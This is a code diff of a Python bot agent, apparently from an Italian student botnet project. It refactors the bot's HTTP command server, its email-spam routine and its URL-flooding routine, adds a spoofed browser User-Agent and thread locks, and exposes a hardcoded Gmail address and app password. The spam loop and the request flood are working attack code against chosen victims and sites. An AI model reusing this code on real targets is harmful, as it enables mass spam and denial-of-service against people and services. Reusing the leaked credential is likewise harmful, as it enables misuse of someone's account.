@@ -8,13 +8,14 @@ from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
 from email.mime.text import MIMEText
 from http.server import HTTPServer, BaseHTTPRequestHandler
-
-import requests
+from urllib.error import HTTPError, URLError
+from urllib.request import Request, urlopen
 
 server_address = ('10.0.2.15', 15200)
 
 
 # server_address = ('localhost', 15200)
+
 
 def initialize_bot():
     print("Initializing bot...")
@@ -56,6 +57,8 @@ class Bot(BaseHTTPRequestHandler):
         'targets': [],
     }
 
+    lock = threading.Lock()
+
     def set_header(self):
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
@@ -76,7 +79,8 @@ class Bot(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/status":
             self.set_header()
-            self.wfile.write(json.dumps(self.current_action).encode('utf-8'))
+            with self.lock:
+                self.wfile.write(json.dumps(self.current_action).encode('utf-8'))
         if self.path == "/client-info":
             self.set_header()
             self.wfile.write(json.dumps(get_client_info()).encode('utf-8'))
@@ -103,8 +107,9 @@ class Bot(BaseHTTPRequestHandler):
     def mail_spam(self, victims, message, obj, number_of_emails):
         sender = "botnetsicurezza@gmail.com"
         password = "cebqshlncuewhjso"
-        self.current_action['operation'] = 'Mail spam in corso'
-        self.current_action['targets'] = victims
+
+        self.set_current_action('Mail spam in corso', victims)
+
         for _ in range(number_of_emails):
             for victim in victims:
                 msg = MIMEText(message)
@@ -115,20 +120,32 @@ class Bot(BaseHTTPRequestHandler):
                 smtp_server.login(sender, password)
                 smtp_server.sendmail(sender, victim, msg.as_string())
                 smtp_server.quit()
-        self.reset_current_action()
+        self.set_current_action()
 
     def request_spam(self, url, e):
-        self.current_action['operation'] = 'Attacco in corso'
-        self.current_action['targets'] = [url]
+        self.set_current_action('Attacco in corso', [url])
         e.clear()
         while not e.is_set():
-            res = requests.get(url)
-            print(f"Request sent to {url} with status code {res.status_code}")
-        self.reset_current_action()
+            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            try:
+                urlopen(req).read()
+            except HTTPError as error:
+                e.set()
+                print(f'HTTPError: {error}')
+            except URLError as error:
+                e.set()
+                print(f'URLError: {error}')
+            else:
+                print(f'Attacco in corso a {url}')
 
-    def reset_current_action(self):
-        self.current_action['operation'] = 'In attesa di un comando'
-        self.current_action['targets'] = []
+        self.set_current_action()
+
+    def set_current_action(self, operation='In attesa di un comando', targets=None):
+        if targets is None:
+            targets = []
+        with self.lock:
+            self.current_action['operation'] = operation
+            self.current_action['targets'] = targets
 
 
 if __name__ == '__main__':
